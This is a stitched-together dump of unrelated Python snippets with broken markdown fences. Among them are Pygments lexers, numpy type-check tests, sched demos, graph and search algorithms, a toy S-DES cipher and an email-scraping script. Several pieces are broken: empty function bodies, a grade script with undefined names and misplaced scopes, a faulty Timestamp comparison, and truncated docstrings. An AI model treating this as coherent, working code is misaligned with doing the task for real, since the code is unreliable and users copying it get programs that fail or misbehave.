            raise ValueError("Invalid value for nanoseconds in Timestamp: {0}".format(nsec))
        if sec < 0:
            nsec = -nsec
        self.sec = int(sec)
        self.nsec = int(nsec)

    def __str__(self):
        return "{0}.{1:09d}".format(self.sec, self.nsec)

    def __repr__(self):
        return "Timestamp({0}, {1})".format(self.sec, self.nsec)

    def __float__(self):
        return float(self.sec) + float(self.nsec) / 1e9

    def __eq__(self, other):
        return type(self) == type(other) and self.sec == other.sec and self.nsec == other.nsec

    def __ne__(self, other):
        return not self == other

    def __gt__(self, other):
        return self.sec > other.sec or self.nsec > other.nsec


# Timestamp and exemplar are optional.
# Value can be an int or a float.
# Timestamp can be a float containing a unixtime in seconds,
# a Timestamp object, or None.
# Exemplar can be an Exemplar object, or None.
Sample = namedtuple('Sample', ['name', 'labels', 'value', 'timestamp', 'exemplar'])
Sample.__new__.__defaults__ = (None, None)

Exemplar = namedtuple('Exemplar', ['labels', 'value', 'timestamp'])
Exemplar.__new__.__defaults__ = (None,)

#!/bin/python
#author: tobias mueller 13.6.13
#byteplay test

from sys import version_info
from dis import dis
from _pydevd_frame_eval.vendored.bytecode import Bytecode, ConcreteBytecode, dump_bytecode
from pprint import pprint

def f(a, b):
#    res = a + b
    return

def g(a, b):
    res = a + b if a < b else b + a
    r = 0
    for a in range(res):
        r += 1
    return r or 2

for x in (f, g):
    #get byte code for f
    dis(x)
    print(f.__code__.co_code)
    c = Bytecode.from_code(x.__code__)
    cc = ConcreteBytecode.from_code(x.__code__)
    dump_bytecode(c)
    dump_bytecode(cc)

    #generate byte code
    cnew = c.to_code()

    x.__code__ = cnew
    dis(x)

    print(x(3,5))
````

````py
    pygments.styles.sas
    ~~~~~~~~~~~~~~~~~~~

    Style inspired by SAS' enhanced program editor. Note This is not
    meant to be a complete style. It's merely meant to mimic SAS'
    program editor syntax highlighting.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
    Number, Other, Whitespace, Generic


class SasStyle(Style):
    """
    Style inspired by SAS' enhanced program editor. Note This is not
    meant to be a complete style. It's merely meant to mimic SAS'
    program editor syntax highlighting.
    """

    default_style = ''

    styles = {
        Whitespace:            '#bbbbbb',
        Comment:               'italic #008800',
        String:                '#800080',
        Number:                'bold #2e8b57',
        Other:                 'bg:#ffffe0',
        Keyword:               '#2c2cff',
        Keyword.Reserved:      'bold #353580',
        Keyword.Constant:      'bold',
        Name.Builtin:          '#2c2cff',
        Name.Function:         'bold italic',
        Name.Variable:         'bold #2c2cff',
        Generic:               '#2c2cff',
        Generic.Emph:          '#008800',
        Generic.Error:         '#d30202',
        Error:                 'bg:#e3d2d2 #a61717'
    }

from setuptools.command.setopt import edit_config, option_base


class saveopts(option_base):
    """Save command-line options to a file"""

    description = "save supplied options to setup.cfg or other config file"

    def run(self):
        dist = self.distribution
        settings = {}

        for cmd in dist.command_options:

            if cmd == "saveopts":
                continue  # don't save our own options!

            for opt, (src, val) in dist.get_option_dict(cmd).items():
                if src == "command line":
                    settings.setdefault(cmd, {})[opt] = val

        edit_config(self.filename, settings, self.dry_run)

from __future__ import absolute_import, division, unicode_literals

from xml.sax.xmlreader import AttributesNSImpl

from ..constants import adjustForeignAttributes, unadjustForeignAttributes

prefix_mapping = {}
for prefix, localName, namespace in adjustForeignAttributes.values():
    if prefix is not None:
        prefix_mapping[prefix] = namespace


def to_sax(walker, handler):
    """Call SAX-like content handler based on treewalker walker

    :arg walker: the treewalker to use to walk the tree to convert it

    :arg handler: SAX handler to use

    """
    handler.startDocument()
    for prefix, namespace in prefix_mapping.items():
        handler.startPrefixMapping(prefix, namespace)

    for token in walker:
        type = token["type"]
        if type == "Doctype":
            continue
        elif type in ("StartTag", "EmptyTag"):
            attrs = AttributesNSImpl(token["data"], unadjustForeignAttributes)
            handler.startElementNS(
                (token["namespace"], token["name"]), token["name"], attrs
            )
            if type == "EmptyTag":
                handler.endElementNS((token["namespace"], token["name"]), token["name"])
        elif type == "EndTag":
            handler.endElementNS((token["namespace"], token["name"]), token["name"])
        elif type in ("Characters", "SpaceCharacters"):
            handler.characters(token["data"])
        elif type == "Comment":
            pass
        else:
            assert False, "Unknown token type"

    for prefix, namespace in prefix_mapping.items():
        handler.endPrefixMapping(prefix)
    handler.endDocument()

import sys
import numpy as np

f2: np.float16
f8: np.float64
c8: np.complex64

# Construction

np.float32(3j)  # E: incompatible type

# Technically the following examples are valid NumPy code. But they
# are not considered a best practice, and people who wish to use the
# stubs should instead do
#
# np.array([1.0, 0.0, 0.0], dtype=np.float32)
# np.array([], dtype=np.complex64)
#
# See e.g. the discussion on the mailing list
#
# https://mail.python.org/pipermail/numpy-discussion/2020-April/080566.html
#
# and the issue
#
# https://github.com/numpy/numpy-stubs/issues/41
#
# for more context.
np.float32([1.0, 0.0, 0.0])  # E: incompatible type
np.complex64([])  # E: incompatible type

np.complex64(1, 2)  # E: Too many arguments
# TODO: protocols (can't check for non-existent protocols w/ __getattr__)

np.datetime64(0)  # E: non-matching overload

class A:
    def __float__(self):
        return 1.0


np.int8(A())  # E: incompatible type
np.int16(A())  # E: incompatible type
np.int32(A())  # E: incompatible type
np.int64(A())  # E: incompatible type
np.uint8(A())  # E: incompatible type
np.uint16(A())  # E: incompatible type
np.uint32(A())  # E: incompatible type
np.uint64(A())  # E: incompatible type

np.void("test")  # E: incompatible type

np.generic(1)  # E: Cannot instantiate abstract class
np.number(1)  # E: Cannot instantiate abstract class
np.integer(1)  # E: Cannot instantiate abstract class
np.inexact(1)  # E: Cannot instantiate abstract class
np.character("test")  # E: Cannot instantiate abstract class
np.flexible(b"test")  # E: Cannot instantiate abstract class

np.float64(value=0.0)  # E: Unexpected keyword argument
np.int64(value=0)  # E: Unexpected keyword argument
np.uint64(value=0)  # E: Unexpected keyword argument
np.complex128(value=0.0j)  # E: Unexpected keyword argument
np.str_(value='bob')  # E: No overload variant
np.bytes_(value=b'test')  # E: No overload variant
np.void(value=b'test')  # E: Unexpected keyword argument
np.bool_(value=True)  # E: Unexpected keyword argument
np.datetime64(value="2019")  # E: No overload variant
np.timedelta64(value=0)  # E: Unexpected keyword argument

np.bytes_(b"hello", encoding='utf-8')  # E: No overload variant
np.str_("hello", encoding='utf-8')  # E: No overload variant

complex(np.bytes_("1"))  # E: No overload variant

f8.item(1)  # E: incompatible type
f8.item((0, 1))  # E: incompatible type
f8.squeeze(axis=1)  # E: incompatible type
f8.squeeze(axis=(0, 1))  # E: incompatible type
f8.transpose(1)  # E: incompatible type

def func(a: np.float32) -> None: ...

func(f2)  # E: incompatible type
func(f8)  # E: incompatible type

round(c8)  # E: No overload variant

c8.__getnewargs__()  # E: Invalid self argument
f2.__getnewargs__()  # E: Invalid self argument
f2.is_integer()  # E: Invalid self argument
f2.hex()  # E: Invalid self argument
np.float16.fromhex("0x0.0p+0")  # E: Invalid self argument
f2.__trunc__()  # E: Invalid self argument
f2.__getformat__("float")  # E: Invalid self argument

thm = int(0)
print("Enter the Number of Requests : ") #Number of I/O Requets
req = int(input())
print("Enter the Initial Head Position : ") #Initial position of Disk Head
hp = int(input())
pos = hp
print("Enter the Seek Rate : ")
srate = int(input())
print("Enter the Requests : ")
arr = [ int(input()) for i in range(req)]
start = 0
end = 199 #Start and End of Head Positions
print(hp, end='')
if(hp<100):
    for i in range(pos, start-1, -1): #Iterates the movement from initial to start of track
        if i in arr:
            thm+= abs(pos-i)
            pos = i
            print(" -> ",i, end='')
            arr.remove(i)
    thm+= abs(pos-start)
    pos = start
    print(" -> ", start, end='')
    for i in range(pos, end+1): #Scans back to end
        if i in arr:
            thm+= abs(pos-i)
            pos = i
            print(" -> ", i, end='')
            arr.remove(i)
else:
    for i in range(pos, end+1): #Iterates the movement from initial to end of track
        if i in arr:
            thm+= abs(pos-i)
            pos = i
            print(" -> ",i, end='')
            arr.remove(i)
    thm+= abs(pos-end)
    pos = end
    print(" -> ", end, end='')
    for i in range(pos, start-1,-1): #Scans back to start
        if i in arr:
            thm+= abs(pos-i)
            pos = i
            print(" -> ", i, end='')
            arr.remove(i)
stime = thm * srate
print("\nThe Total Head Movement is",thm)
print("The Seek Time is",stime)```


```py
    pygments.scanner
    ~~~~~~~~~~~~~~~~

    This library implements a regex based scanner. Some languages
    like Pascal are easy to parse but have some keywords that
    depend on the context. Because of this it's impossible to lex
    that just by using a regular expression lexer like the
    `RegexLexer`.

    Have a look at the `DelphiLexer` to get an idea of how to use
    this scanner.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py
import re


class EndOfText(RuntimeError):
    """
    Raise if end of text is reached and the user
    tried to call a match function.
    """


class Scanner:
    """
    Simple scanner

    All method patterns are regular expression strings (not
    compiled expressions!)
    """

    def __init__(self, text, flags=0):
        """
        :param text:    The text which should be scanned
        :param flags:   default regular expression flags
        """
        self.data = text
        self.data_length = len(text)
        self.start_pos = 0
        self.pos = 0
        self.flags = flags
        self.last = None
        self.match = None
        self._re_cache = {}

    def eos(self):
        """`True` if the scanner reached the end of text."""
        return self.pos >= self.data_length
    eos = property(eos, eos.__doc__)

    def check(self, pattern):
        """
        Apply `pattern` on the current position and return
        the match object. (Doesn't touch pos). Use this for
        lookahead.
        """
        if self.eos:
            raise EndOfText()
        if pattern not in self._re_cache:
            self._re_cache[pattern] = re.compile(pattern, self.flags)
        return self._re_cache[pattern].match(self.data, self.pos)

    def test(self, pattern):
        """Apply a pattern on the current position and check
        if it patches. Doesn't touch pos.
        """
        return self.check(pattern) is not None

    def scan(self, pattern):
        """
        Scan the text for the given pattern and update pos/match
        and related fields. The return value is a boolen that
        indicates if the pattern matched. The matched value is
        stored on the instance as ``match``, the last value is
        stored as ``last``. ``start_pos`` is the position of the
        pointer before the pattern was matched, ``pos`` is the
        end position.
        """
        if self.eos:
            raise EndOfText()
        if pattern not in self._re_cache:
            self._re_cache[pattern] = re.compile(pattern, self.flags)
        self.last = self.match
        m = self._re_cache[pattern].match(self.data, self.pos)
        if m is None:
            return False
        self.start_pos = m.start()
        self.pos = m.end()
        self.match = m.group()
        return True

    def get_char(self):
        """Scan exactly one char."""
        self.scan('.')

    def __repr__(self):
        return '<%s %d/%d>' % (
            self.__class__.__name__,
            self.pos,
            self.data_length
        )

from __future__ import print_function
# n - no of nodes, m - no of edges
n, m = list(map(int,input().split()))

g = [[] for i in range(n)] #graph
r = [[] for i in range(n)] #reversed graph
# input graph data (edges)
for i in range(m):
    u, v = list(map(int,input().split()))
    g[u].append(v)
    r[v].append(u)

stack = []
visit = [False]*n
scc = []
component = []

def dfs(u):
    global g, r, scc, component, visit, stack
    if visit[u]: return
    visit[u] = True
    for v in g[u]:
        dfs(v)
    stack.append(u)

def dfs2(u):
    global g, r, scc, component, visit, stack
    if visit[u]: return
    visit[u] = True
    component.append(u)
    for v in r[u]:
        dfs2(v)

def kosaraju():
    global g, r, scc, component, visit, stack
    for i in range(n):
        dfs(i)
    visit = [False]*n
    for i in stack[::-1]:
        if visit[i]: continue
        component = []
        dfs2(i)
        scc.append(component)
    return scc

print(kosaraju())
````

````py
    pygments.lexers.scdoc
    ~~~~~~~~~~~~~~~~~~~~~

    Lexer for scdoc, a simple man page generator.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import re

from pygments.lexer import RegexLexer, include, bygroups, \
    using, this
from pygments.token import Text, Comment, Keyword, String, \
    Generic


__all__ = ['ScdocLexer']


class ScdocLexer(RegexLexer):
    """
    `scdoc` is a simple man page generator for POSIX systems written in C99.
    https://git.sr.ht/~sircmpwn/scdoc

    .. versionadded:: 2.5
    """
    name = 'scdoc'
    aliases = ['scdoc', 'scd']
    filenames = ['*.scd', '*.scdoc']
    flags = re.MULTILINE

    tokens = {
        'root': [
            # comment
            (r'^(;.+\n)', bygroups(Comment)),

            # heading with pound prefix
            (r'^(#)([^#].+\n)', bygroups(Generic.Heading, Text)),
            (r'^(#{2})(.+\n)', bygroups(Generic.Subheading, Text)),
            # bulleted lists
            (r'^(\s*)([*-])(\s)(.+\n)',
            bygroups(Text, Keyword, Text, using(this, state='inline'))),
            # numbered lists
            (r'^(\s*)(\.+\.)( .+\n)',
            bygroups(Text, Keyword, using(this, state='inline'))),
            # quote
            (r'^(\s*>\s)(.+\n)', bygroups(Keyword, Generic.Emph)),
            # text block
            (r'^(```\n)([\w\W]*?)(^```$)', bygroups(String, Text, String)),

            include('inline'),
        ],
        'inline': [
            # escape
            (r'\\.', Text),
            # underlines
            (r'(\s)(_[^_]+_)(\W|\n)', bygroups(Text, Generic.Emph, Text)),
            # bold
            (r'(\s)(\*[^*]+\*)(\W|\n)', bygroups(Text, Generic.Strong, Text)),
            # inline code
            (r'`[^`]+`', String.Backtick),

            # general text, must come last!
            (r'[^\\\s]+', Text),
            (r'.', Text),
        ],
    }

    def analyse_text(text):
        """This is very similar to markdown, save for the escape characters
        needed for * and _."""
        result = 0

        if '\\*' in text:
            result += 0.01

        if '\\_' in text:
            result += 0.01

        return result

#!/usr/bin/env python3```


```pyBasic sched example```


```py

#end_pymotw_header
import sched
import time

scheduler = sched.scheduler(time.time, time.sleep)


def print_event(name, start):
    now = time.time()
    elapsed = int(now - start)
    print('EVENT: {} elapsed={} name={}'.format(
        time.ctime(now), elapsed, name))


start = time.time()
print('START:', time.ctime(start))
scheduler.enter(2, 1, print_event, ('first', start))
scheduler.enter(3, 1, print_event, ('second', start))

scheduler.run()

#!/usr/bin/env python3```


```pyBasic sched example```


```py

#end_pymotw_header
import sched
import threading
import time

scheduler = sched.scheduler(time.time, time.sleep)

# Set up a global to be modified by the threads
counter = 0


def increment_counter(name):
    global counter
    print('EVENT:', time.ctime(time.time()), name)
    counter += 1
    print('NOW:', counter)


print('START:', time.ctime(time.time()))
e1 = scheduler.enter(2, 1, increment_counter, ('E1',))
e2 = scheduler.enter(3, 1, increment_counter, ('E2',))

# Start a thread to run the events
t = threading.Thread(target=scheduler.run)
t.start()

# Back in the main thread, cancel the first scheduled event.
scheduler.cancel(e1)

# Wait for the scheduler to finish running in the thread
t.join()

print('FINAL:', counter)

#!/usr/bin/env python3```


```pyOverlapping events sched example```


```py

#end_pymotw_header
import sched
import time

scheduler = sched.scheduler(time.time, time.sleep)


def long_event(name):
    print('BEGIN EVENT :', time.ctime(time.time()), name)
    time.sleep(2)
    print('FINISH EVENT:', time.ctime(time.time()), name)


print('START:', time.ctime(time.time()))
scheduler.enter(2, 1, long_event, ('first',))
scheduler.enter(3, 1, long_event, ('second',))

scheduler.run()

#!/usr/bin/env python3```


```pyBasic sched example```


```py

#end_pymotw_header
import sched
import time

scheduler = sched.scheduler(time.time, time.sleep)


def print_event(name):
    print('EVENT:', time.ctime(time.time()), name)


now = time.time()
print('START:', time.ctime(now))
scheduler.enterabs(now + 2, 2, print_event, ('first',))
scheduler.enterabs(now + 2, 1, print_event, ('second',))

scheduler.run()
````

````py
For types associated with installation schemes.

For a general overview of available schemes and their context, see
https://docs.python.org/3/install/index.html#alternate-installation.```


```py


SCHEME_KEYS = ["platlib", "purelib", "headers", "scripts", "data"]


class Scheme:
    """A Scheme holds paths which are used as the base directories for
    artifacts associated with a Python package.
    """

    __slots__ = SCHEME_KEYS

    def __init__(
        self, platlib: str, purelib: str, headers: str, scripts: str, data: str
    ) -> None:
        self.platlib = platlib
        self.purelib = purelib
        self.headers = headers
        self.scripts = scripts
        self.data = data

# Write a function that returns the groups in the school by year (as a string), separated with a comma and space in the form of "1a, 1b, 1c, 1d, 2a, 2b (....) 6d, 7a, 7b, 7c, 7d".

# Examples:

# csSchoolYearsAndGroups(years = 7, groups = 4) ➞ "1a, 1b, 1c, 1d, 2a, 2b, 2c, 2d, 3a, 3b, 3c, 3d, 4a, 4b, 4c, 4d, 5a, 5b, 5c, 5d, 6a, 6b, 6c, 6d, 7a, 7b, 7c, 7d"
# Notes:

# 1 <= years <= 10
# 1 <= groups <=26
# [execution time limit] 4 seconds (py3)

# [input] integer years

# [input] integer groups

# [output] string


def schoolGroups(years, groups):
    alphabet = list(map(chr, range(97, 123)))
    emp_list = []
    for year in range(1, years + 1):
        for group in range(0, groups):
            emp_list.append(f"{year}{alphabet[group]}")
    # print(emp_list)
    return ", ".join(emp_list)


print(schoolGroups(1, 4))
print(schoolGroups(6, 7))

scale = 1.1


def make_mul(n):
    def mul(val):
        out = val * n * scale  # <1>
        return out  # <2>

    return mul


mul7 = make_mul(7)
print(mul7(3))  # 23.1

# visit: https://imgur.com/a/oemBqyv
count = 0
total = 0
# Handle any exceptions using try/except
try:

    def main():
        # Initialize variables
        count = 0
        total = 0

        # Opens the Section1.txt file.
        infile = open("Section1.txt", "r")

        # Reads the numbers in the file into a list
        num = infile.readlines()

        for num in infile:
            number = float(num)
            total = total + number
            count = count + 1
            average = total / count

            # Close the file
            infile.close

    # Output: display the number of the scores, and the average of the scores
    print("Number of scores in Section 1: ", count)
    print("Average: ", format((average), ".2f"), "Letter Grade: ")

    total2 = 0
    count2 = 0

    infile2 = open("Section2.txt.", "r")

    for num in infile2:
        number = float(num)
        total2 = total2 + number
        count2 = count2 + 1
        average2 = total2 / count2

    infile2.close

    print("Number of scores in Section 2: ", count2)
    print("Average: ", format((average2), ".2f"), "Letter Grade: ", score)

    total_count = count1 + count2
    total_average = (total1 + total2) / total_count
    print("Numbers of score in both sections combined: ", total_count)
    print("Average: ", format((total_average), ".2f"), "Letter grade: ", score)

    scoring(grade)

    def scoring(grade):
        # Create outputs for numerical scores, make "else" anything below 0 or over 100
        if 89.5 <= grade <= 100:
            print("The letter grade is A")
        elif 79.5 <= grade <= 89.4:
            print("The letter grade is B")
        elif 69.5 <= grade <= 79.4:
            print("The letter grade is C")
        elif 59.5 <= grade <= 69.4:
            print("The letter grade is D")
        elif 0 <= grade <= 59.4:
            print("The letter grade is F")
        else:
            print("invalid score")

    main()


except IOError:
    print("An error occurred trying to open the file")

except ValueError:
    print("Non-numeric data found in the file")

except Exception as err:
    print(err)
````

````py
developed by: markmelnic
original repo: https://github.com/markmelnic/Scoring-Algorithm

Analyse data using a range based percentual proximity algorithm
and calculate the linear maximum likelihood estimation.
The basic principle is that all values supplied will be broken
down to a range from 0 to 1 and each column's score will be added
up to get the total score.

==========
Example for data of vehicles
price|mileage|registration_year
20k  |60k    |2012
22k  |50k    |2011
23k  |90k    |2015
16k  |210k   |2010

We want the vehicle with the lowest price,
lowest mileage but newest registration year.
Thus the weights for each column are as follows:
[0, 0, 1]

>>> procentual_proximity([[20, 60, 2012],[23, 90, 2015],[22, 50, 2011]], [0, 0, 1])
[[20, 60, 2012, 2.0], [23, 90, 2015, 1.0], [22, 50, 2011, 1.3333333333333335]]```


```py


def procentual_proximity(source_data: list, weights: list) -> list:

    """
    weights - int list
    possible values - 0 / 1
    0 if lower values have higher weight in the data set
    1 if higher values have higher weight in the data set
    """

    # getting data
    data_lists = []
    for item in source_data:
        for i in range(len(item)):
            try:
                data_lists[i].append(float(item[i]))
            except IndexError:
                # generate corresponding number of lists
                data_lists.append([])
                data_lists[i].append(float(item[i]))

    score_lists = []
    # calculating each score
    for dlist, weight in zip(data_lists, weights):
        mind = min(dlist)
        maxd = max(dlist)

        score = []
        # for weight 0 score is 1 - actual score
        if weight == 0:
            for item in dlist:
                try:
                    score.append(1 - ((item - mind) / (maxd - mind)))
                except ZeroDivisionError:
                    score.append(1)

        elif weight == 1:
            for item in dlist:
                try:
                    score.append((item - mind) / (maxd - mind))
                except ZeroDivisionError:
                    score.append(0)

        # weight not 0 or 1
        else:
            raise ValueError("Invalid weight of %f provided" % (weight))

        score_lists.append(score)

    # initialize final scores
    final_scores = [0 for i in range(len(score_lists[0]))]

    # generate final scores
    for i, slist in enumerate(score_lists):
        for j, ele in enumerate(slist):
            final_scores[j] = final_scores[j] + ele

    # append scores to source data
    for i, ele in enumerate(final_scores):
        source_data[i].append(ele)

    return source_data

import numpy as np
````

````py Here I implemented the scoring functions.
    MAE, MSE, RMSE, RMSLE are included.

    Those are used for calculating differences between
    predicted values and actual values.

    Metrics are slightly differentiated. Sometimes squared, rooted,
    even log is used.

    Using log and roots can be perceived as tools for penalizing big
    erors. However, using appropriate metrics depends on the situations,
    and types of data```


```py

#Mean Absolute Error
def mae(predict, actual):
    predict = np.array(predict)
    actual = np.array(actual)

    difference = abs(predict - actual)
    score = difference.mean()

    return score

#Mean Squared Error
def mse(predict, actual):
    predict = np.array(predict)
    actual = np.array(actual)

    difference = predict - actual
    square_diff = np.square(difference)

    score = square_diff.mean()
    return score

#Root Mean Squared Error
def rmse(predict, actual):
    predict = np.array(predict)
    actual = np.array(actual)

    difference = predict - actual
    square_diff = np.square(difference)
    mean_square_diff = square_diff.mean()
    score = np.sqrt(mean_square_diff)
    return score

#Root Mean Square Logarithmic Error
def rmsle(predict, actual):
    predict = np.array(predict)
    actual = np.array(actual)

    log_predict = np.log(predict+1)
    log_actual = np.log(actual+1)

    difference = log_predict - log_actual
    square_diff = np.square(difference)
    mean_square_diff = square_diff.mean()

    score = np.sqrt(mean_square_diff)

    return score

#Mean Bias Deviation
def mbd(predict, actual):
    predict = np.array(predict)
    actual = np.array(actual)

    difference = predict - actual
    numerator = np.sum(difference) / len(predict)
    denumerator =  np.sum(actual) / len(predict)
    print(numerator)
    print(denumerator)

    score = float(numerator) / denumerator * 100

    return score

languages = ["Java", "Python", "JavaScript"]
versions = [14, 3, 6]

result = zip(languages, versions)
print(list(result))

def csRemoveDuplicateWords(input_str):
    return " ".join(dict.fromkeys(input_str.split()))


print(
    csRemoveDuplicateWords(
        "alpha bravo bravo golf golf golf delta alpha bravo bravo golf golf golf delta"
    )
)
print(csRemoveDuplicateWords("my dog is my dog is super smart"))

print(csRemoveDuplicateWords("Your tests are broken broken broken broken broken"))

# Singly-linked lists are already defined with this interface:
class ListNode(object):
  def __init__(self, x):
    self.value = x
    self.next = None


def condense_linked_list(node):


# Singly-linked lists are already defined with this interface:
class ListNode(object):
  def __init__(self, x):
    self.value = x
    self.next = None


def condense_linked_list(node):


class ListNode(object):
    def __init__(self, x):
        self.value = x
        self.next = None


def condense_linked_list(node):
    ptr1 = None
    ptr2 = None
    dup = None
    ptr1 = node

    # Pick elements one by one
    while ptr1 != None and ptr1.next != None:

        ptr2 = ptr1

        # Compare the picked element with rest
        # of the elements
        while ptr2.next != None:

            # If duplicate then delete it
            if ptr1.value == ptr2.next.value:

                # Sequence of steps is important here
                dup = ptr2.next
                ptr2.next = ptr2.next.next
            else:
                ptr2 = ptr2.next

        ptr1 = ptr1.next

import requests
import re
from bs4 import BeautifulSoup


def scrape_emails(ADDR):
    # get the data
    data = requests.get(ADDR)
    # extract all emails on a web page
    emails = re.findall(r'([\d\w\.]+@[\d\w\.\-]+\.\w+)', data.text)

    return emails


def bs_scrape(ADDR):
    data = requests.get(ADDR)
    soup = BeautifulSoup(data.text, "html.parser")
    return soup


# print(scrape_emails("https://www.swfc.co.uk/club/club-contacts/"))

soup = bs_scrape("https://www.swfc.co.uk/club/club-contacts/")

# grab the tags and print them
#for item in soup.find_all("a"):
#    print(item)

# lets scrape the data from a game leaderboard now

umg = bs_scrape("https://umggaming.com/leaderboards")

leader = umg.find("table", {"id": "leaderboard-table"})

tbody = leader.find("tbody")

players = []

for tr in tbody.find_all("tr"):
    place = tr.find_all("td")[0].text.strip()
    username = tr.find_all("td")[1].text.strip()
    xp = tr.find_all("td")[3].text.strip()
    # print(place, username, xp)
    players.append({"place": place, "username": username, "xp": xp})

print(players)

### text translator in python ###
from textblob import TextBlob


def Translate():
    Lang = [
        'Hindi', 'Bengali', 'Tamil', 'Telugu', 'Malayalam', 'Marathi',
        'Gujarati'
    ]
    for i in range(len(Lang)):
        print("Press " + str(i) + " for " + Lang[i])
    lang_list = {
        Lang[0]: 'hi',
        Lang[1]: 'bn',
        Lang[2]: 'ta',
        Lang[3]: 'te',
        Lang[4]: 'ml',
        Lang[5]: 'mr',
        Lang[6]: 'gu'
    }
    Target_lang = int(input())
    text = open("textfiles/input.txt", "r")
    content = TextBlob(text.read())
    final = content.translate(to=lang_list[Lang[Target_lang]])
    translation = open("textfiles/output.txt", 'w', encoding="utf-8")
    # print(str(final))
    translation.write(str(final))
    text.close()
    translation.close()


if __name__ == "__main__":
    Translate()
````

````py
    This algorithm was created for sdbm (a public-domain reimplementation of ndbm)
    database library.
    It was found to do well in scrambling bits, causing better distribution of the keys
    and fewer splits.
    It also happens to be a good general hashing function with good distribution.
    The actual function (pseudo code) is:
        for i in i..len(str):
            hash(i) = hash(i - 1) * 65599 + str[i];

    What is included below is the faster version used in gawk. [there is even a faster,
    duff-device version]
    The magic constant 65599 was picked out of thin air while experimenting with
    different constants.
    It turns out to be a prime.
    This is one of the algorithms used in berkeley db (see sleepycat) and elsewhere.

    source: http://www.cse.yorku.ca/~oz/hash.html```


```py


def sdbm(plain_text: str) -> int:
    """
    Function implements sdbm hash, easy to use, great for bits scrambling.
    iterates over each character in the given string and applies function to each of
    them.

    >>> sdbm('Algorithms')
    1462174910723540325254304520539387479031000036

    >>> sdbm('scramble bits')
    730247649148944819640658295400555317318720608290373040936089
    """
    hash = 0
    for plain_chr in plain_text:
        hash = ord(plain_chr) + (hash << 6) + (hash << 16) - hash
    return hash

def apply_table(inp, table):
    """
    >>> apply_table("0123456789", list(range(10)))
    '9012345678'
    >>> apply_table("0123456789", list(range(9, -1, -1)))
    '8765432109'
    """
    res = ""
    for i in table:
        res += inp[i - 1]
    return res


def left_shift(data):
    """
    >>> left_shift("0123456789")
    '1234567890'
    """
    return data[1:] + data[0]


def XOR(a, b):
    """
    >>> XOR("01010101", "00001111")
    '01011010'
    """
    res = ""
    for i in range(len(a)):
        if a[i] == b[i]:
            res += "0"
        else:
            res += "1"
    return res


def apply_sbox(s, data):
    row = int("0b" + data[0] + data[-1], 2)
    col = int("0b" + data[1:3], 2)
    return bin(s[row][col])[2:]


def function(expansion, s0, s1, key, message):
    left = message[:4]
    right = message[4:]
    temp = apply_table(right, expansion)
    temp = XOR(temp, key)
    l = apply_sbox(s0, temp[:4])  # noqa: E741
    r = apply_sbox(s1, temp[4:])
    l = "0" * (2 - len(l)) + l  # noqa: E741
    r = "0" * (2 - len(r)) + r
    temp = apply_table(l + r, p4_table)
    temp = XOR(left, temp)
    return temp + right


if __name__ == "__main__":

    key = input("Enter 10 bit key: ")
    message = input("Enter 8 bit message: ")

    p8_table = [6, 3, 7, 4, 8, 5, 10, 9]
    p10_table = [3, 5, 2, 7, 4, 10, 1, 9, 8, 6]
    p4_table = [2, 4, 3, 1]
    IP = [2, 6, 3, 1, 4, 8, 5, 7]
    IP_inv = [4, 1, 3, 5, 7, 2, 8, 6]
    expansion = [4, 1, 2, 3, 2, 3, 4, 1]
    s0 = [[1, 0, 3, 2], [3, 2, 1, 0], [0, 2, 1, 3], [3, 1, 3, 2]]
    s1 = [[0, 1, 2, 3], [2, 0, 1, 3], [3, 0, 1, 0], [2, 1, 0, 3]]

    # key generation
    temp = apply_table(key, p10_table)
    left = temp[:5]
    right = temp[5:]
    left = left_shift(left)
    right = left_shift(right)
    key1 = apply_table(left + right, p8_table)
    left = left_shift(left)
    right = left_shift(right)
    left = left_shift(left)
    right = left_shift(right)
    key2 = apply_table(left + right, p8_table)

    # encryption
    temp = apply_table(message, IP)
    temp = function(expansion, s0, s1, key1, temp)
    temp = temp[4:] + temp[:4]
    temp = function(expansion, s0, s1, key2, temp)
    CT = apply_table(temp, IP_inv)
    print("Cipher text is:", CT)

    # decryption
    temp = apply_table(CT, IP)
    temp = function(expansion, s0, s1, key2, temp)
    temp = temp[4:] + temp[:4]
    temp = function(expansion, s0, s1, key1, temp)
    PT = apply_table(temp, IP_inv)
    print("Plain text after decypting is:", PT)

# linear search O(n)
def name_in_phonebook(to_find, phonebook):
    for name in phonebook:
        if name == to_find:
            return True
    return False

# binary search O(log n)
def name_in_phonebook_2(to_find, name):
    # sentinal , edge case
    if len(to_find) == 0:
        return False
    # set first element to zero
    first = 0
    # set the last items to size - 1
    last = (len(to_find) - 1)
    # set a found flag to false
    found = False

    # loop until either found or end of list
    while first <= last and not found:
        # find the middle of the list using interger division //
        middle = (first + last) // 2

        # if found update found variable
        if to_find[middle] == name:
            found = True
        # otherwise
        else:
            # if name  is to the left of the data
            if name < to_find[middle]:
                # search the lower half
                last = middle - 1
            # otherwise
            else:
                # search the upper half
                first = middle + 1
    # return found
    return found


````

````py
Search a 2D Matrix

Write an efficient algorithm that searches for a value in an m x n matrix.
This matrix has the following properties:
- Integers in each row are sorted in ascending from left to right.
- Integers in each column are sorted in ascending from top to bottom.

Input: target = 21
[
  [1,   4,  7, 11, 15],
  [2,   5,  8, 12, 19],
  [3,   6,  9, 16, 22],
  [10, 13, 14, 17, 24],
  [18, 21, 23, 26, 30]
]
Output: True

=========================================
Start from bottom left corner and search in top right direction.
    Time Complexity:    O(N + M)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def search_2d_matrix(matrix, target):
    n = len(matrix)
    m = len(matrix[0])

    j = 0
    i = n - 1

    while (i >= 0) and (j < m):
        if matrix[i][j] > target:
            i -= 1
        elif matrix[i][j] < target:
            j += 1
        else:
            return True

    return False


###########
# Testing #
###########

# Test 1
# Correct result => True
print(
    search_2d_matrix(
        [
            [1, 4, 7, 11, 15],
            [2, 5, 8, 12, 19],
            [3, 6, 9, 16, 22],
            [10, 13, 14, 17, 24],
            [18, 21, 23, 26, 30],
        ],
        21,
    )
)

# Test 2
# Correct result => False
print(
    search_2d_matrix(
        [
            [1, 4, 7, 11, 15],
            [2, 5, 8, 12, 19],
            [3, 6, 9, 16, 22],
            [10, 13, 14, 17, 24],
